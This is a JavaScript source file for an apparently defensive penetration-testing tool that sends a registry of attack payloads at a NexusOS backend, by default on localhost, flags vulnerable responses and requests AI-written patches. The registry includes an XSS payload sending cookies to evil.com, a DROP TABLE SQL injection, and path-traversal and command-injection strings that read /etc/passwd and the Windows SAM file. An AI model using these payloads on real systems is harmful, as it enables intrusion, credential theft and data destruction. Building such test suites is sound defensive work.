/**
 * ============================================================
 *  🐒 Chaos Guardian V2 — NexusOS Resilience & Pen Tester
 * ============================================================
 *  An automated security testing suite that fires targeted
 *  attack vectors against the NexusOS backend, analyzes
 *  responses for vulnerabilities, and auto-generates security
 *  patches via the Dual-Provider AI. Integrates with the
 *  Sentinel self-healing pipeline for autonomous hardening.
 *
 *  Evolved from: Vibelab/backend/scripts/chaos_monkey.js
 *  Original: 5 basic attacks, console.log, hardcoded axios,
 *            patch saved to .vibelab_drafts/
 * ============================================================
 */

import logger from '@nexus/logger';

// ── Attack Vector Registry ──────────────────────────────────
const ATTACK_VECTORS = [
    {
        name: 'Massive Payload (50k chars)',
        category: 'dos',
        payload: { message: 'A'.repeat(50000) },
        expectedSafeStatus: [400, 413, 429],
        severity: 'medium'
    },
    {
        name: 'SQL Injection (Union-based)',
        category: 'sqli',
        payload: { message: "' UNION SELECT * FROM users WHERE '1'='1" },
        expectedSafeStatus: [400, 403],
        severity: 'critical'
    },
    {
        name: 'SQL Injection (Drop Table)',
        category: 'sqli',
        payload: { message: "'; DROP TABLE users; --" },
        expectedSafeStatus: [400, 403],
        severity: 'critical'
    },
    {
        name: 'NoSQL Injection (MongoDB $ne)',
        category: 'nosql',
        payload: { message: { $ne: null, $gt: '' } },
        expectedSafeStatus: [400, 403],
        severity: 'critical'
    },
    {
        name: 'NoSQL Injection ($regex)',
        category: 'nosql',
        payload: { message: { $regex: '.*', $options: 'i' } },
        expectedSafeStatus: [400, 403],
        severity: 'high'
    },
    {
        name: 'XSS Script Injection',
        category: 'xss',
        payload: { message: "<script>document.location='http://evil.com?c='+document.cookie</script>" },
        expectedSafeStatus: [400, 403],
        severity: 'high'
    },
    {
        name: 'XSS Polyglot',
        category: 'xss',
        payload: { message: "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */onerror=alert() )//%0D%0A%0d%0a" },
        expectedSafeStatus: [400, 403],
        severity: 'high'
    },
    {
        name: 'Prototype Pollution',
        category: 'prototype',
        payload: { '__proto__': { isAdmin: true, role: 'superuser' }, message: 'test' },
        expectedSafeStatus: [400, 403],
        severity: 'critical'
    },
    {
        name: 'Path Traversal (etc/passwd)',
        category: 'traversal',
        payload: { filepath: '../../../../etc/passwd', message: 'read' },
        expectedSafeStatus: [400, 403],
        severity: 'critical'
    },
    {
        name: 'Path Traversal (Windows)',
        category: 'traversal',
        payload: { filepath: '..\\..\\..\\..\\Windows\\System32\\config\\SAM', message: 'read' },
        expectedSafeStatus: [400, 403],
        severity: 'critical'
    },
    {
        name: 'Command Injection',
        category: 'rce',
        payload: { message: '; cat /etc/passwd; echo "pwned"' },
        expectedSafeStatus: [400, 403],
        severity: 'critical'
    },
    {
        name: 'Header Injection (CRLF)',
        category: 'header',
        payload: { message: 'test\r\nX-Injected: true\r\nSet-Cookie: hacked=true' },
        expectedSafeStatus: [400, 403],
        severity: 'high'
    }
];

class ChaosGuardianEvolved {
    constructor() {
        /** @type {boolean} */
        this.isRunning = false;
        /** @type {Array<object>} */
        this.results = [];
        /** @type {string} Full markdown report */
        this.lastReport = '';
    }

    // ═══════════════════════════════════════════════════════════
    //  ATTACK EXECUTION
    // ═══════════════════════════════════════════════════════════

    /**
     * Executes a single attack vector against the target.
     * @param {string} targetUrl - Full URL to attack
     * @param {object} vector - Attack vector definition
     * @param {string} [authToken] - Optional auth token
     * @returns {Promise<object>} Attack result
     */
    async _executeAttack(targetUrl, vector, authToken) {
        const startTime = Date.now();
        try {
            const headers = {
                'Content-Type': typeof vector.payload === 'string' ? 'text/plain' : 'application/json',
            };
            if (authToken) headers['Authorization'] = `Bearer ${authToken}`;

            const response = await fetch(targetUrl, {
                method: 'POST',
                headers,
                body: JSON.stringify(vector.payload),
                signal: AbortSignal.timeout(8000)
            });

            const elapsed = Date.now() - startTime;
            const isSafe = vector.expectedSafeStatus.includes(response.status);

            let responseBody = '';
            try { responseBody = await response.text(); } catch { /* ignore */ }

            // Check for reflected content (XSS detection)
            const reflected = typeof vector.payload === 'object' && vector.payload.message
                ? responseBody.includes(String(vector.payload.message))
                : false;

            const vulnerable = !isSafe || reflected;

            return {
                name: vector.name,
                category: vector.category,
                severity: vector.severity,
                status: response.status,
                elapsed,
                vulnerable,
                reflected,
                expectedSafe: isSafe,
                detail: vulnerable
                    ? `⚠️ Server returned ${response.status} (expected one of [${vector.expectedSafeStatus}])${reflected ? ' — INPUT REFLECTED IN RESPONSE!' : ''}`
                    : `✅ Server safely responded with ${response.status}`
            };
        } catch (err) {
            const elapsed = Date.now() - startTime;

            // Connection refusal or timeout = server crash or unreachable
            const isCrash = err.name === 'AbortError' || err.message?.includes('ECONNREFUSED');
            return {
                name: vector.name,
                category: vector.category,
                severity: vector.severity,
                status: 0,
                elapsed,
                vulnerable: isCrash,
                reflected: false,
                expectedSafe: false,
                detail: isCrash
                    ? `💀 Server CRASHED or TIMED OUT: ${err.message}`
                    : `⚠️ Request error: ${err.message}`
            };
        }
    }

    // ═══════════════════════════════════════════════════════════
    //  AI PATCH GENERATION
    // ═══════════════════════════════════════════════════════════

    /**
     * Generates a security middleware patch via the AI for a found vulnerability.
     * @param {object} vuln - Vulnerability result object
     * @returns {Promise<string | null>} Generated patch code
     */
    async _generatePatch(vuln) {
        try {
            const aiServiceModule = await import('./aiService.js');
            const aiService = aiServiceModule.default;

            const prompt = `You are an elite Node.js Security Engineer for NexusOS.
The backend failed or showed vulnerability when hit with this attack: [${vuln.name}] (Category: ${vuln.category}, Severity: ${vuln.severity}).
Server response status: ${vuln.status}. Detail: ${vuln.detail}.

Write a robust Express.js middleware that:
1. Completely blocks this attack vector.
2. Returns a clean 400 or 403 JSON error instead of crashing.
3. Uses ESM import/export syntax.
4. Integrates with @nexus/logger for security audit logging.
5. Is production-ready with comprehensive input validation.

Output ONLY the JavaScript code. No explanations, no markdown fences.`;

            const result = await aiService.prompt(null, {
                text: prompt,
                type: 'code_analysis',
                urgency: 'high'
            });

            if (result?.success && result?.response) {
                return result.response.trim().replace(/^```[\w]*\n?/gm, '').replace(/```\s*$/gm, '').trim();
            }
            return null;
        } catch (err) {
            logger.error(`🐒 [CHAOS-V2] Patch generation failed: ${err.message}`);
            return null;
        }
    }

    // ═══════════════════════════════════════════════════════════
    //  REPORT BUILDER
    // ═══════════════════════════════════════════════════════════

    /**
     * Builds a structured markdown report from test results.
     * @returns {string}
     */
    _buildReport() {
        const vulns = this.results.filter(r => r.vulnerable);
        const safe = this.results.filter(r => !r.vulnerable);

        let report = `# 🐒 Chaos Guardian V2 — Security Report\n\n`;
        report += `**Date:** ${new Date().toISOString()}\n`;
        report += `**Vectors Tested:** ${this.results.length}\n`;
        report += `**Vulnerabilities Found:** ${vulns.length}\n`;
        report += `**Resilient:** ${safe.length}\n\n`;

        if (vulns.length > 0) {
            report += `## ⚠️ Vulnerabilities\n\n`;
            report += `| Attack | Category | Severity | Status | Detail |\n`;
            report += `|---|---|---|---|---|\n`;
            for (const v of vulns) {
                report += `| ${v.name} | ${v.category} | ${v.severity} | ${v.status} | ${v.detail} |\n`;
            }
            report += `\n`;
        }

        if (safe.length > 0) {
            report += `## ✅ Resilient\n\n`;
            report += `| Attack | Category | Status | Time |\n`;
            report += `|---|---|---|---|\n`;
            for (const s of safe) {
                report += `| ${s.name} | ${s.category} | ${s.status} | ${s.elapsed}ms |\n`;
            }
        }

        return report;
    }

    // ═══════════════════════════════════════════════════════════
    //  MAIN EXECUTION
    // ═══════════════════════════════════════════════════════════

    /**
     * Runs the full attack battery against a target.
     * @param {{ targetUrl?: string, authToken?: string, generatePatches?: boolean }} config
     * @returns {Promise<{ results: Array, vulnerabilities: number, report: string, patches: Array }>}
     */
    async runChaos(config = {}) {
        if (this.isRunning) return { results: [], vulnerabilities: 0, report: 'Already running.', patches: [] };

        this.isRunning = true;
        this.results = [];
        const patches = [];
        const targetUrl = config.targetUrl || 'http://localhost:3001/api/ai/prompt';
        const generatePatches = config.generatePatches ?? true;

        logger.info(`🐒 [CHAOS-V2] ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`);
        logger.info(`🐒 [CHAOS-V2] Attack battery STARTING on: ${targetUrl}`);
        logger.info(`🐒 [CHAOS-V2] Vectors: ${ATTACK_VECTORS.length} | Patch Gen: ${generatePatches}`);
        logger.info(`🐒 [CHAOS-V2] ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`);

        for (let i = 0; i < ATTACK_VECTORS.length; i++) {
            const vector = ATTACK_VECTORS[i];
            logger.info(`🐒 [CHAOS-V2] [${i + 1}/${ATTACK_VECTORS.length}] Firing: ${vector.name}`);

            const result = await this._executeAttack(targetUrl, vector, config.authToken);
            this.results.push(result);

            if (result.vulnerable) {
                logger.warn(`🐒 [CHAOS-V2] 🚨 VULNERABLE: ${result.detail}`);

                if (generatePatches) {
                    logger.info(`🐒 [CHAOS-V2] 🧠 Generating AI security patch...`);
                    const patch = await this._generatePatch(result);
                    if (patch) {
                        patches.push({ attackName: vector.name, category: vector.category, patch });
                        logger.info(`🐒 [CHAOS-V2] 🛡️ Patch generated for: ${vector.name}`);
                    }
                }
            } else {
                logger.info(`🐒 [CHAOS-V2] ✅ Resilient: ${result.detail}`);
            }

            // Cooldown between attacks
            await new Promise(r => setTimeout(r, 300));
        }

        const vulns = this.results.filter(r => r.vulnerable);
        this.lastReport = this._buildReport();

        logger.info(`🐒 [CHAOS-V2] ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`);
        logger.info(`🐒 [CHAOS-V2] COMPLETE: ${vulns.length}/${ATTACK_VECTORS.length} vulnerabilities found.`);
        logger.info(`🐒 [CHAOS-V2] ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`);

        this.isRunning = false;

        return {
            results: this.results,
            vulnerabilities: vulns.length,
            report: this.lastReport,
            patches
        };
    }

    /**
     * Returns the status and last report.
     * @returns {object}
     */
    getStatus() {
        return {
            isRunning: this.isRunning,
            totalVectors: ATTACK_VECTORS.length,
            lastResultCount: this.results.length,
            lastVulnerabilities: this.results.filter(r => r.vulnerable).length
        };
    }
}

export default new ChaosGuardianEvolved();
